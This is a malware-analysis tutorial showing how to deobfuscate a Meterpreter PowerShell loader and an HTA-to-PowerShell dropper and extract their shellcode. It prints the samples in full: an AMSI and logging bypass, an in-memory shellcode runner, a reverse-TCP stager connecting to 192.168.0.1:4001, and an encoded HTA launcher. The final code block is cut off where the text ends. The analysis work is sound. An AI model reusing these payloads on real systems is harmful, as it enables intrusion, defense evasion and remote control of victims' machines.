---
tags: Shellcode
---

## All Things Shellcode - Meterpreter, Cobalt Strike

Shellcode is a small piece of executable code used as a payload and is usually written in assembly language.

The primary goal of shellcode is to perform a specific action on the target system, such as spawning a command shell or establishing a network connection. 

Below are a couple of examples of deobfuscating scripts to reveal shellcode, and then analysing the shellcode to find the underlying commands.

## Meterpreter Shellcode Obfuscated in PowerShell
Taking apart a Meterpreter Payload encoded within an obfuscated PowerShell script.

Below is an example of a command line which is often associated with exploitation attempts via Metasploit

```powershell
C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -nop -w hidden -noni -c <!#-- if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c
$x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new();
$gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u''));
$plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a''));
if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null);
If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}
{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object
System.IO.MemoryStream(,
[System.Convert]::FromBase64String(((''''H4sIA{1}wxYWUA/7VWbW/aShP9X''+''qn/waqQsHUJmJf2kkiVnjX{1}QIOJiQMkUFRt7MVsWXuJvQ5Bvf3vnfV{0}QtSkzXOvasnCXs/M''+''zp45c4ZV{1}rqC8lCh723l29s3Sn7ZOMKBopbcGW/fV5QS3WqPH0t+m42Uj4q6QNttlweYhsuTk04SRSQU2Xu1RwSKYx{0}cM{1}piVVP+UWZr{1}pGj85uvxBXKN6X0pdpj/Aaz3Gzfwe6aK{1}co9OS3IXexTKzqbBkVavnz57K2OKovq6e3CWaxWnb2sSBB1WOsrCnfNbnh5X5{0}1{0}JF3YjHfCWqMxo2G9VJGOMVGUG0O2IRseZeXIbDPB4nIiKJwuxUMkxmpJbh0Y64izwvInFcrig{0}ucFiufyfush3v0hCQ''+''QNSHYSCRHzrkOiOuiSu9nHoMXJBVkvwckR{1}Q3+paWB2xzd{1}{0}YUJYxXl/wmjjsiuwO61Tuqh{1}1jZItIqUNNnzmlx{0}2{1}k8yw/k2jGAw2ujAuA33cJ4QN9Alz/0n2GQI8{0}xbVIvxDIWbV5TFPvj4peUSzYHQse7eG1dBklRFs+IK6UghY6q7w2Wr1wBce7XgIriymn3v{0}R/wkBSqvb3vS9tHqZz12yoiHp7kMcU{0}eg7BO{1}i7KQFYNXSd3''+''CbAQZquX8A/G6hB{1}fCwm0ZMdPbqcBFQ++RkKZRy{0}kQmljyAqqrj1NJqudWh6{1}FgkAvuwd6FpaQaOQwjpvjn2xu3wHo3KH4TiuKHYCnepWFIdgRryKgsKY5p9QInj6KFsgT9dKmKAujkURbnmoDyme+b4dHsYiSlyo{0}GBw6WyJSzGTkFSUPvWIsXeoX+x/sMMBIB3MGHQQR{0}qDgsCKBMIRki8RpJpyQ6s6RAyC{0}SMB2KTSYT{0}sg1DkfZISDPv{1}k83/bKZFP2Tkl9gUoBzkCQV3GBcVZUojA''+''UokcQaK/assfpag{0}J1ORPICqUWj{0}Yy9kI1QCofjxkZSNYcpBSUSAIgZ8cDAMfnQygRHfVc7pzaC67rbdyiZbmh9sIPbgntCmwNurdq20HlguZ3Y7pltRHf+zm2PkOt98sixA3bjaUt0bNQfU91orV1Dv0yf/Wta933kjcZrl+n26ea+1op1uuvPZKwshttq9a''+''901Gy2zpv6BgCUPhvwCejufgjPoKznQ2MQG/qAnX7qXNzMGuZ8xvq1lrlezXjsf{0}ju1mq1Yw93rT1CBvea1v6qfs{1}v+25gt{1}JeO+60NugUoU54OjUNfnZtRMiuTbG/5bszH6GZ30HorzUl8/H{1}NMZj00CT3tfb7nHNrx3PrvDam{1}0bd{0}69uljDu7nrj62a3hp45J63hzM6vZOxjFvDnF9hNJzvzVqtfh038MbgyABgzfkt6q2vt6bNwP9y0uBoykaPtuN+9''+''8yd1/+OrY/voJK{0}CQ1Fs7GUjdmUovf2TYm5x+2Dcr4k6haO4jVm''+''UGZQ66{0}nTB6ZuQDbH{1}KDCKpyjm9IFBIGow+GY8FTxBh3pfxnSg2zJ5sIckBN4BHSeu5JgyGfG4{0}4F3OhWDo5mUOWwP2UldUhCX2xruj3TV0HQdfv9VbK8tcfrsO3e5g6Mhr4Q2AJz0N8lsaHkHSlq{0}8dnv''+''8ZMhj+AhToF6C9hB/svQHBAAn{0}mliiaHDODjHMj/bAiScQAnZ1OP5Cjv6U{0}RDiiNwqJVBSoh3O2VJyc37zRwmUq9{1}afrzf{1}uhx7RdfX0UqvZIh9NPy04UDMf9z{1}MwwFWDogKoyko37F5DIu+agz{0}I+0BKr''+''/J{0}/hM8TcTSCf1aptv8AyS{1}BNoI{0}AAA='')-f''L'',''E'')))),
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```

Obfuscation is used in the form of concatenating the base64 encoded string, and gzip compression.
We can identify the value of the arrays after a given sequence by looking for the '-f' argument.

"-f''L'',''E''"

{0} = L

{1} = E

Then it's a case of getting the Base64 encoded string, removing the concatenations and replacing the array values.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b813cf1a-4d3a-4b1d-86ef-17d99456d3b5)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d8739fc4-2063-4328-a35a-b8d931da62ae)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5108a2ac-dbb7-4ff2-a75c-c4623fc25fc8)




Next, we'll add a From Base64 and Gunzip operator to reveal the following code:

```powershell
function i5P {
        Param ($cWo8x, $ip)
        $g8lN = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $g8lN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($g8lN.GetMethod('GetModuleHandle')).Invoke($null, @($cWo8x)))), $ip))
}

function ma1_D {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m4AK,
                [Parameter(Position = 1)] [Type] $vGu = [Void]
        )

        $fqGV5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $fqGV5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m4AK).SetImplementationFlags('Runtime, Managed')
        $fqGV5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vGu, $m4AK).SetImplementationFlags('Runtime, Managed')

        return $fqGV5.CreateType()
}

[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQV4tCPAHQi0B4hcB0TAHQi0gYi1ggAdNQhcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpowKgAAWgCAA+hieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM=")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($nLQ2k, 0, $lc98, $nLQ2k.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualProtect), (ma1_D @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lc98, [Uint32]$nLQ2k.Length, 0x10, [Ref]$fal3)) -eq $true) {
        $ubOb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll CreateThread), (ma1_D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lc98,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll WaitForSingleObject), (ma1_D @([IntPtr], [Int32]))).Invoke($ubOb,0xffffffff) | Out-Null
}
```

This [articale](https://isc.sans.edu/diary/Fileless+Malicious+PowerShell+Sample/23081) from SANS probably does a better job of explaining the grittier details of this script.

But what we are interested in is the Base64 string.
We'll throw it into CyberChef and add a From Base64 and To Hex operator to reveal the shellcode

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/80ecde0b-f1b1-4185-a322-9f616a2fe4e7)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7c49af16-e21f-4871-817b-017094a1c3ab)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a544358b-3b91-426a-b8fb-d49f52f2c702)




```
fc e8 8f 00 00 00 60 31 d2 89 e5 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 31 ff 0f b7 4a 26 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 49 75 ef 52 8b 52 10 57 8b 42 3c 01 d0 8b 40 78 85 c0 74 4c 01 d0 8b 48 18 8b 58 20 01 d3 50 85 c9 74 3c 49 31 ff 8b 34 8b 01 d6 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e0 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 e9 80 ff ff ff 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 89 e8 ff d0 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 0a 68 c0 a8 00 01 68 02 00 0f a1 89 e6 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0c ff 4e 08 75 ec 68 f0 b5 a2 56 ff d5 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 01 c3 29 c6 75 ee c3
```

Then with this shellcode, we can use a x86 Dissassembler to reveal the instructions.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8408cee5-eb25-4b97-9c69-e4d3a2662760)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/00b20d83-8eba-4fba-b1de-2773dd0d4b13)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f808fc0b-ad87-486e-a540-8a7bdcd0758d)




To find the IP which the shell will call back to, we need to look for the PUSH instructions above the MOV ESI,ESP instruction, which is above multiple PUSH RAX insutrctions

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5a5efcb0-f9c4-4bde-a647-ccdc421dc1b4)

By taking the Hex contents of the first PUSH instruction, after 68 (Which is just the instruction to PUSH), we get C0A80001, converting this From Hex, To Decimal, we get our source IP: 192.168.0.1

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b72c9cec-eb6f-40bf-9f31-56d0b864d465)

Alternatively, we can use Speakeasy:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4a3deab4-3618-4d5f-a89c-ab3a89abab82)

```
* exec: shellcode
0x10aa: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000
0x10ba: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0
0x10d7: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4
0x10e3: 'ws2_32.connect(0x4, "192.168.0.1:4001", 0x10)' -> 0x0
0x1100: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4
0x1113: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000
0x1121: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8
0x50008: Unhandled interrupt: intnum=0x3
0x50008: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```


## HTA > PowerShell > Shellcode

This sample begins with a HTA script, as follows:

```
<script>
tszJiHJvyBxIKisKzcmHKR = "WS";
VoZouSWKcNpnLvA = "crip";
hyhlgEZiBgaCjaJPrNpDrZQi = "t.Sh";
PTBsdHRJtLQIpJAeqZ = "ell";
qQnZFFhoGvbrgs = (tszJiHJvyBxIKisKzcmHKR + VoZouSWKcNpnLvA + hyhlgEZiBgaCjaJPrNpDrZQi + PTBsdHRJtLQIpJAeqZ);
rwXRzuPgvutxxjOvbZUWejvaCO=new ActiveXObject(qQnZFFhoGvbrgs);
NGebvfDRMyzcdzWfqARaBRovQ = "cm";
JlCKObjiHOicmdivHQGHBhp = "d.e";
VYdWjsNKEaSIfEGExQu = "xe";
ckFMmsPAsm = (NGebvfDRMyzcdzWfqARaBRovQ + JlCKObjiHOicmdivHQGHBhp + VYdWjsNKEaSIfEGExQu);
rwXRzuPgvutxxjOvbZUWejvaCO.run('%windir%\\System32\\' + ckFMmsPAsm + ' /c powershell -w 1 -C "sv Ki -;sv xP ec;sv s ((gv Ki).value.toString()+(gv xP).value.toString());powershell (gv s).value.toString() \'JABNAFAAbQAgAD0AIAAnACQATQBQACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAZwBMACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQATQBQACAALQBOAGEAbQBlACAAIgBXAGkAbgAzADIAIgAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQA7AFsAQgB5AHQAZQBbAF0AXQA7AFsAQgB5AHQAZQBbAF0AXQAkAGEATgAgAD0AIAAwAHgAZgBjACwAMAB4AGUAOAAsADAAeAA4ADkALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgAwACwAMAB4ADgAOQAsADAAeABlADUALAAwAHgAMwAxACwAMAB4AGQAMgAsADAAeAA2ADQALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAzADAALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAwAGMALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADQALAAwAHgAOABiACwAMAB4ADcAMgAsADAAeAAyADgALAAwAHgAMABmACwAMAB4AGIANwAsADAAeAA0AGEALAAwAHgAMgA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAAwAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeABlADIALAAwAHgAZgAwACwAMAB4ADUAMgAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADAALAAwAHgAOABiACwAMAB4ADQAMgAsADAAeAAzAGMALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADcAOAAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeAA0AGEALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA1ADAALAAwAHgAOABiACwAMAB4ADQAOAAsADAAeAAxADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADAALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeABlADMALAAwAHgAMwBjACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQAwACwAMAB4ADcANQAsADAAeABmADQALAAwAHgAMAAzACwAMAB4ADcAZAAsADAAeABmADgALAAwAHgAMwBiACwAMAB4ADcAZAAsADAAeAAyADQALAAwAHgANwA1ACwAMAB4AGUAMgAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwAsADAAeAA0AGIALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAxAGMALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgAMAA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAOAAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQBiACwAMAB4ADgANgAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADMAMwAsADAAeAAzADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADcAMwAsADAAeAAzADIALAAwAHgANQBmACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgAMAA3ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAYgA4ACwAMAB4ADkAMAAsADAAeAAwADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAyADkALAAwAHgAYwA0ACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4ADIAOQAsADAAeAA4ADAALAAwAHgANgBiACwAMAB4ADAAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA0ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkANwAsADAAeAA2AGEALAAwAHgAMAA1ACwAMAB4ADYAOAAsADAAeAAzADMALAAwAHgANABmACwAMAB4ADMAMQAsADAAeABhAGUALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADYAYQAsADAAeAAxADAALAAwAHgANQA2ACwAMAB4ADUANwAsADAAeAA2ADgALAAwAHgAOQA5ACwAMAB4AGEANQAsADAAeAA3ADQALAAwAHgANgAxACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADQALAAwAHgAMABjACwAMAB4AGYAZgAsADAAeAA0AGUALAAwAHgAMAA4ACwAMAB4ADcANQAsADAAeABlAGMALAAwAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAAwADAALAAwAHgANgBhACwAMAB4ADAANAAsADAAeAA1ADYALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4AGIALAAwAHgAMwA2ACwAMAB4ADYAYQAsADAAeAA0ADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA1ADYALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA2AGEALAAwAHgAMAAwACwAMAB4ADUANgAsADAAeAA1ADMALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAwADEALAAwAHgAYwAzACwAMAB4ADIAOQAsADAAeABjADYALAAwAHgAOAA1ACwAMAB4AGYANgAsADAAeAA3ADUALAAwAHgAZQBjACwAMAB4AGMAMwA7ACQAVQBkACAAPQAgADAAeAAxADAAMAAwADsAaQBmACAAKAAkAGEATgAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABVAGQAIAA9ACAAJABhAE4ALgBMAGUAbgBnAHQAaAB9ADsAJABtAE0APQAkAGcATAA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAFUAZAAsADAAeAA0ADAAKQA7AGYAbwByACAAKAAkAEIAdwA9ADAAOwAkAEIAdwAgAC0AbABlACAAKAAkAGEATgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABCAHcAKwArACkAIAB7ACQAZwBMADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAbQBNAC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAEIAdwApACwAIAAkAGEATgBbACQAQgB3AF0ALAAgADEAKQB9ADsAJABnAEwAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAG0ATQAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAKQB7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAYwBGACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAE0AUABtACkAKQA7ACQAcABxACAAPQAgACIALQBlAGMAIAAiADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAEoAcgAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJABKAHIAIAAkAHAAcQAgACQAYwBGACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkAHAAcQAgACQAYwBGACIAOwB9AA==\'"', 0);window.close();
</script>
```

There are references to WScript and PowerShell, followed by a large Base64 blob, we'll decode this blob to reveal the contents:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7d041fc7-25e7-4329-ab68-053176191270)


```
$MPm = '$MP = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$gL = Add-Type -memberDefinition $MP -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];[Byte[]]$aN =
